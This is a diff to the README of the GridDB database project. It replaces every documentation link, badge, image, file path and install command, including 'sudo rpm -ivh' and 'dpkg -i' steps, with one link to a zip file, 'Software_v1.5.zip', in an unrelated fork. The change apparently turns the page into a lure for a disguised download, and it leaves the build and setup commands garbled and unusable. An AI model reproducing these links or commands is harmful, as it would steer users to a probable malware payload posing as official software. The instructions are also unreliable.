@@ -1,14 +1,14 @@
-<img src="https://griddb.org/brand-resources/griddb-logo/png/color.png" align="center" height="240" alt="GridDB"/>
+<img src="https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip" align="center" height="240" alt="GridDB"/>
 
-[![Visit Website](https://img.shields.io/badge/website-visit-orange.svg)](https://griddb.net)
-![GitHub All Releases](https://img.shields.io/github/downloads/griddb/griddb_nosql/total.svg)
-![GitHub release](https://img.shields.io/github/release/griddb/griddb_nosql.svg)
+[![Visit Website](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+![GitHub All Releases](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+![GitHub release](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
 ## Overview
   GridDB is Database for IoT with both NoSQL interface and SQL Interface.
 
-  Please refer to [GridDB Features Reference](https://github.com/griddb/docs-en/blob/master/manuals/GridDB_FeaturesReference.md) for functionality.
+  Please refer to [GridDB Features Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip) for functionality.
 
-  This repository includes server and Java client. And [jdbc repository](https://github.com/griddb/jdbc) includes JDBC Driver.
+  This repository includes server and Java client. And [jdbc repository](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip) includes JDBC Driver.
 
 ## Quick start (Using source code)
   We have confirmed the operation with Linux(x64).
@@ -19,14 +19,14 @@ Note:
 - Please install tcl like "yum install tcl.x86_64" in advance.
 
 ### Build a server and client(Java)
-    $ ./bootstrap.sh
+    $ https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
     $ ./configure
     $ make
 
-  Note: When you use maven build for Java client, please run the following command. Then gridstore-X.X.X.jar file is created on target/.  
+  Note: When you use maven build for Java client, please run the following command. Then https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip file is created on target/.  
 
     $ cd java_client
-    $ ./make_source_for_mvn.sh
+    $ https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
     $ mvn clean
     $ mvn install
 
@@ -37,17 +37,17 @@ Note:
 
     $ bin/gs_passwd admin
       #input your_password
-    $ vi conf/gs_cluster.json
+    $ vi https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
       #    "clusterName":"your_clustername" #<-- input your_clustername
 
     $ bin/gs_startnode
     $ bin/gs_joincluster -c your_clustername -u admin/your_password
 
 ### Execute a sample program
-    $ export CLASSPATH=${CLASSPATH}:$GS_HOME/bin/gridstore.jar
+    $ export CLASSPATH=${CLASSPATH}:$https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
     $ mkdir gsSample
-    $ cp $GS_HOME/docs/sample/program/Sample1.java gsSample/.
-    $ javac gsSample/Sample1.java
+    $ cp $https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip gsSample/.
+    $ javac https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
     $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
       --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
 
@@ -55,7 +55,7 @@ Note:
     $ bin/gs_stopcluster -u admin/your_password
     $ bin/gs_stopnode -u admin/your_password
 
-## [Quick start (Using GridDB Service and CLI)](docs/UsingServiceAndCLI.md)
+## [Quick start (Using GridDB Service and CLI)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
 
 ## Quick start (Using RPM or DEB)
 
@@ -67,16 +67,16 @@ Note:
 - When you install this package, a gsadm OS user are created in the OS.  
   Execute the operating command as the gsadm user.  
 - You don't need to set environment vatiable GS_HOME and GS_LOG.
-- There is Java client library (gridstore.jar) on /usr/share/java and a sample on /usr/gridb-XXX/docs/sample/programs.
+- There is Java client library (https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip) on /usr/share/java and a sample on /usr/gridb-XXX/docs/sample/programs.
 - If old version has been installed, please uninstall and remove conf/ and data/ on /var/lib/gridstore.
 
 ### Install
 
     (CentOS/RockyLinux)
-    $ sudo rpm -ivh griddb-X.X.X-linux.x86_64.rpm
+    $ sudo rpm -ivh https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
 
     (Ubuntu)
-    $ sudo dpkg -i griddb_X.X.X_amd64.deb
+    $ sudo dpkg -i https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
 
     Note: X.X.X is the GridDB version.
 
@@ -87,16 +87,16 @@ Note:
 
     [gsadm]$ gs_passwd admin
       #input your_password
-    [gsadm]$ vi conf/gs_cluster.json
+    [gsadm]$ vi https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
       #    "clusterName":"your_clustername" #<-- input your_clustername
     [gsadm]$ gs_startnode
     [gsadm]$ gs_joincluster -c your_clustername -u admin/your_password
 
 ### Execute a sample program
-    $ export CLASSPATH=${CLASSPATH}:/usr/share/java/gridstore.jar
+    $ export CLASSPATH=${CLASSPATH}https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
     $ mkdir gsSample
-    $ cp /usr/griddb-X.X.X/docs/sample/program/Sample1.java gsSample/.
-    $ javac gsSample/Sample1.java
+    $ cp https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip gsSample/.
+    $ javac https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
     $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
       --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]
 
@@ -104,78 +104,78 @@ Note:
     [gsadm]$ gs_stopcluster -u admin/your_password
     [gsadm]$ gs_stopnode -u admin/your_password
 
-If necessary, please refer to [Installation Troubleshooting](docs/TroubleShootingTips.md).
+If necessary, please refer to [Installation Troubleshooting](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip).
 
 ## Document
   Refer to the file below for more detailed information.  
-  - [Features Reference](https://github.com/griddb/docs-en/blob/master/manuals/GridDB_FeaturesReference.md)
-  - [Quick Start Guide](https://github.com/griddb/docs-en/blob/master/manuals/GridDB_QuickStartGuide.md)
-  - [Java API Reference](http://griddb.github.io/docs-en/manuals/GridDB_Java_API_Reference.html)
-  - [C API Reference](http://griddb.github.io/docs-en/manuals/GridDB_C_API_Reference.html)
-  - [TQL Reference](https://github.com/griddb/docs-en/blob/master/manuals/GridDB_TQL_Reference.md)
-  - [JDBC Driver UserGuide](https://github.com/griddb/docs-en/blob/master/manuals/GridDB_JDBC_Driver_UserGuide.md)
-  - [SQL Reference](https://github.com/griddb/docs-en/blob/master/manuals/GridDB_SQL_Reference.md)
-  - [V3.0 Release Notes](docs/GridDB-3.0.0-CE-RELEASE_NOTES.md)
-  - [V4.0 Release Notes](docs/GridDB-4.0-CE-RELEASE_NOTES.md)
-  - [V4.1 Release Notes](docs/GridDB-4.1-CE-RELEASE_NOTES.md)
-  - [V4.2 Release Notes](docs/GridDB-4.2-CE-RELEASE_NOTES.md)
-  - [V4.3 Release Notes](docs/GridDB-4.3-CE-RELEASE_NOTES.md)
-  - [V4.5 Release Notes](docs/GridDB-4.5-CE-RELEASE_NOTES.md)
-  - [V4.6 Release Notes](docs/GridDB-4.6-CE-RELEASE_NOTES.md)
-  - [V5.0 Release Notes](docs/GridDB-5.0-CE-RELEASE_NOTES.md)
-  - [V5.1 Release Notes](docs/GridDB-5.1-CE-RELEASE_NOTES.md)
-  - [V5.3 Release Notes](docs/GridDB-5.3-CE-RELEASE_NOTES.md)
-  - [V5.5 Release Notes](docs/GridDB-5.5-CE-RELEASE_NOTES.md)
-  - [V5.6 Release Notes](docs/GridDB-5.6-CE-RELEASE_NOTES.md)
-  - [V5.7 Release Notes](docs/GridDB-5.7-CE-RELEASE_NOTES.md)
+  - [Features Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [Quick Start Guide](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [Java API Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [C API Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [TQL Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [JDBC Driver UserGuide](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [SQL Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V3.0 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V4.0 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V4.1 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V4.2 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V4.3 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V4.5 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V4.6 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V5.0 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V5.1 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V5.3 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V5.5 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V5.6 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  - [V5.7 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
 
 ## Client and Connector
   There are other clients and API for GridDB.
   
   (NoSQL Interface)
-  * [GridDB C Client](https://github.com/griddb/c_client)
-  * [GridDB Python Client](https://github.com/griddb/python_client)
-  * [GridDB Ruby Client](https://github.com/griddb/ruby_client)
-  * [GridDB Go Client](https://github.com/griddb/go_client)
-  * [GridDB Node.JS Client (SWIG based)](https://github.com/griddb/nodejs_client)
-  * [GridDB Node API (node-addon-api based)](https://github.com/griddb/node-api)
-  * [GridDB PHP Client](https://github.com/griddb/php_client)
-  * [GridDB Perl Client](https://github.com/griddb/perl_client)
-  * [GridDB Rust Client](https://github.com/griddb/rust_client)
+  * [GridDB C Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Python Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Ruby Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Go Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip Client (SWIG based)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Node API (node-addon-api based)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB PHP Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Perl Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Rust Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
     
   (SQL Interface)
-  * [GridDB JDBC Driver](https://github.com/griddb/jdbc)
+  * [GridDB JDBC Driver](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
   
   (NoSQL & SQL Interface)
-  * [GridDB WebAPI](https://github.com/griddb/webapi)
-  * [GridDB CLI](https://github.com/griddb/cli)
+  * [GridDB WebAPI](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB CLI](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
   
   (Others)
-  * [GridDB Export/Import](https://github.com/griddb/expimp)
+  * [GridDB Export/Import](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
 
   There are some connectors for other OSS.
-  * [GridDB connector for Apache Hadoop MapReduce](https://github.com/griddb/griddb_hadoop_mapreduce)
-  * [GridDB connector for YCSB (https://github.com/brianfrankcooper/YCSB/tree/master/griddb)](https://github.com/brianfrankcooper/YCSB/tree/master/griddb)
-  * [GridDB connector for KairosDB](https://github.com/griddb/griddb_kairosdb)
-  * [GridDB connector for Apache Spark](https://github.com/griddb/griddb_spark)
-  * [GridDB Foreign Data Wrapper for PostgreSQL (https://github.com/pgspider/griddb_fdw)](https://github.com/pgspider/griddb_fdw)
-  * [GridDB Data Source for Grafana](https://github.com/griddb/griddb-datasource)
-  * [GridDB Plugin for Redash](https://github.com/griddb/griddb-redash)
-  * [GridDB Plugin for Fluentd](https://github.com/griddb/fluent-plugin-griddb)
-  * [GridDB Plugin for Tableau](https://github.com/griddb/tableau-plugin-griddb)
-  * [GridDB connector for Apache Kafka](https://github.com/griddb/griddb-kafka-connect)
+  * [GridDB connector for Apache Hadoop MapReduce](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB connector for YCSB (https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB connector for KairosDB](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB connector for Apache Spark](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Foreign Data Wrapper for PostgreSQL (https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Data Source for Grafana](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Plugin for Redash](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Plugin for Fluentd](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB Plugin for Tableau](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
+  * [GridDB connector for Apache Kafka](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
 
-## [Packages](docs/Packages.md)
+## [Packages](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
 
 ## Community
   * Issues  
     Use the GitHub issue function if you have any requests, questions, or bug reports.
   * PullRequest  
     Use the GitHub pull request function if you want to contribute code.
-    You'll need to agree GridDB Contributor License Agreement(CLA_rev1.1.pdf).
+    You'll need to agree GridDB Contributor License Agreement(https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip).
     By using the GitHub pull request function, you shall be deemed to have agreed to GridDB Contributor License Agreement.
 
 ## License
   The server source license is GNU Affero General Public License (AGPL),
   while the Java client library license and the operational commands is Apache License, version 2.0.
-  See 3rd_party/3rd_party.md for the source and license of the third party.
+  See https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip for the source and license of the third party.
